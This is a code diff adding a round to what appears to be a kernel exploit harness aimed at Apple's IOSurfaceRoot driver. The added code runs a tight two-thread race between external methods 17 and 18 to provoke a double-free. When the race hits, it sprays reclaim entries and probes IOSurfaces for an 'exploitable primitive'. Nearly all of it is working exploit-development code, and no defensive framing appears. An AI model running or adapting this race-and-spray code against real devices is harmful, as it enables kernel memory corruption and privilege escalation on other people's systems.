@@ -1334,6 +1334,45 @@ static void *p11b_groomer(void *arg) {
     return NULL;
 }
 
+/* r=209 thread shared state */
+static volatile int r209_go = 0;
+static volatile int r209_stop = 0;
+static io_connect_t r209_conn = IO_OBJECT_NULL;
+static volatile int r209_reg_ok = 0, r209_reg_fail = 0;
+static volatile int r209_dereg_ok = 0, r209_dereg_fail = 0;
+static int r209_max_iters = 0;
+
+static void *r209_reg_thread(void *arg) {
+    (void)arg;
+    uint64_t inp[3] = {0x209, 0, 0};
+    while (!r209_go) ;
+    for (int i = 0; i < r209_max_iters && !r209_stop; i++) {
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t ref = 0x209000 + i;
+        kern_return_t kr = IOConnectCallAsyncMethod(r209_conn, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(&r209_reg_ok, 1);
+        else __sync_fetch_and_add(&r209_reg_fail, 1);
+        mach_port_deallocate(mach_task_self(), wp);
+    }
+    return NULL;
+}
+
+static void *r209_dereg_thread(void *arg) {
+    (void)arg;
+    uint64_t inp[3] = {0x209, 0, 0};
+    while (!r209_go) ;
+    for (int i = 0; i < r209_max_iters && !r209_stop; i++) {
+        kern_return_t kr = IOConnectCallMethod(r209_conn, 18, NULL, 0,
+            inp, 24, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(&r209_dereg_ok, 1);
+        else __sync_fetch_and_add(&r209_dereg_fail, 1);
+    }
+    return NULL;
+}
+
 /* Phase 13: Full PoC Stage C+D — Metal render loop + race variants */
 static volatile int p13_spam_run = 0;
 static io_connect_t p13_spam_conn = IO_OBJECT_NULL;
@@ -25477,6 +25516,164 @@ new_modes:
                 IOObjectRelease(r208_svc);
                 r208_done:
                 rlog("=== r=208 complete ===\n");
+            }
+
+            /* r=209: Tight 2-thread race with anomaly detection
+             *
+             * The p11b_worker has usleep between iterations — too loose.
+             * This uses 2 dedicated threads with NO sleep, hammering the same
+             * entry with sel17/sel18 as fast as possible to maximize race hits.
+             *
+             * After each race batch, checks for anomalies:
+             *   - sel17 returns != 0 (failed to register — entry in bad state)
+             *   - sel18 returns != 0 (failed to deregister — double-free detected)
+             *   - Both succeed but entry is inconsistent
+             *
+             * When anomalies detected, sprays + probes for exploitable primitive.
+             *
+             * Usage: iosurface_sel17 209 [iterations] [batches]
+             */
+            if (rounds == 209) {
+                rlog("\n=== r=209: Tight 2-thread race with anomaly detection ===\n");
+                int r209_iters = 500;
+                int r209_batches = 5;
+                if (argc > 3) r209_iters = atoi(argv[3]);
+                if (argc > 4) r209_batches = atoi(argv[4]);
+                if (r209_iters < 10) r209_iters = 10;
+                if (r209_iters > 5000) r209_iters = 5000;
+                rlog("  Iters/batch: %d  Batches: %d\n", r209_iters, r209_batches);
+
+                io_service_t r209_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r209_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r209_done; }
+
+                int r209_total_anomalies = 0;
+
+                for (int batch = 0; batch < r209_batches; batch++) {
+                    rlog("\n  --- Batch %d/%d ---\n", batch + 1, r209_batches);
+
+                    io_connect_t rc = IO_OBJECT_NULL;
+                    IOServiceOpen(r209_svc, mach_task_self(), 0, &rc);
+                    if (!rc) { rlog("  open failed\n"); continue; }
+
+                    r209_conn = rc;
+                    r209_go = 0;
+                    r209_stop = 0;
+                    r209_reg_ok = r209_reg_fail = 0;
+                    r209_dereg_ok = r209_dereg_fail = 0;
+                    r209_max_iters = r209_iters;
+
+                    pthread_t ta, tb;
+                    pthread_create(&ta, NULL, r209_reg_thread, NULL);
+                    pthread_create(&tb, NULL, r209_dereg_thread, NULL);
+
+                    __sync_synchronize();
+                    r209_go = 1;
+
+                    pthread_join(ta, NULL);
+                    pthread_join(tb, NULL);
+
+                    int anomalies = r209_reg_fail + r209_dereg_fail;
+                    r209_total_anomalies += anomalies;
+                    rlog("  reg: %d ok, %d fail | dereg: %d ok, %d fail | anomalies: %d\n",
+                         r209_reg_ok, r209_reg_fail, r209_dereg_ok, r209_dereg_fail, anomalies);
+
+                    /* If anomalies detected, spray and test */
+                    if (anomalies > 0) {
+                        rlog("  *** RACE HIT — anomalies detected! ***\n");
+
+                        /* Spray to reclaim freed entries */
+                        io_connect_t sconns[4];
+                        mach_port_t swps[256];
+                        int sn = 0;
+                        for (int c = 0; c < 4; c++) {
+                            sconns[c] = IO_OBJECT_NULL;
+                            IOServiceOpen(r209_svc, mach_task_self(), 0, &sconns[c]);
+                            if (!sconns[c]) continue;
+                            for (int e = 0; e < 64; e++) {
+                                mach_port_t wp = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                                mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t ref = 0x2090000 + sn;
+                                uint64_t inp[3] = {(uint64_t)(sn + 0x1000), 0, 0};
+                                IOConnectCallAsyncMethod(sconns[c], 17, wp, &ref, 1,
+                                    NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                                swps[sn++] = wp;
+                            }
+                        }
+                        rlog("  Sprayed %d reclaim entries\n", sn);
+
+                        /* Create probe IOSurfaces */
+                        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                        int w = 32, h = 32, bpe = 4, pf = 0x42475241;
+                        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+                        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+                        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+                        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+                        IOSurfaceRef surfs[200];
+                        int ncreated = 0;
+                        for (int i = 0; i < 200; i++) {
+                            surfs[i] = IOSurfaceCreate(props);
+                            if (surfs[i]) {
+                                ncreated++;
+                                IOSurfaceSetValue(surfs[i], CFSTR("r209_idx"),
+                                    CFNumberCreate(NULL, kCFNumberIntType, &i));
+                            }
+                        }
+                        rlog("  Created %d probe surfaces\n", ncreated);
+
+                        /* Render to trigger compositor */
+                        p13_render_run = 1;
+                        p13_render_frames = 0;
+                        pthread_t rt;
+                        pthread_create(&rt, NULL, p13_render_loop, NULL);
+                        usleep(2000000);
+                        p13_render_run = 0;
+                        pthread_join(rt, NULL);
+                        rlog("  Render: %d frames\n", p13_render_frames);
+
+                        /* Check use counts */
+                        for (int i = 0; i < 200; i++) {
+                            if (!surfs[i]) continue;
+                            int32_t uc = IOSurfaceGetUseCount(surfs[i]);
+                            if (uc != 0) {
+                                rlog("  ** Surface %d: useCount=%d ID=%u **\n",
+                                     i, uc, IOSurfaceGetID(surfs[i]));
+                            }
+                        }
+
+                        /* Cleanup */
+                        for (int i = 0; i < 200; i++)
+                            if (surfs[i]) CFRelease(surfs[i]);
+                        for (int c = 0; c < 4; c++)
+                            if (sconns[c]) IOServiceClose(sconns[c]);
+                        for (int i = 0; i < sn; i++)
+                            mach_port_deallocate(mach_task_self(), swps[i]);
+                        CFRelease(wn); CFRelease(hn);
+                        CFRelease(bn); CFRelease(pfn);
+                        CFRelease(props);
+                    }
+
+                    IOServiceClose(rc);
+                    usleep(200000);
+                }
+
+                rlog("\n=== r=209 RESULTS ===\n");
+                rlog("  Total anomalies across %d batches: %d\n", r209_batches, r209_total_anomalies);
+                if (r209_total_anomalies > 0)
+                    rlog("  RACE CONFIRMED — registry entries in inconsistent state\n");
+                else
+                    rlog("  No anomalies — race window may be too tight for this thread config\n");
+
+                IOObjectRelease(r209_svc);
+                r209_done:
+                rlog("=== r=209 complete ===\n");
             }
 
             IOServiceClose(conn17);
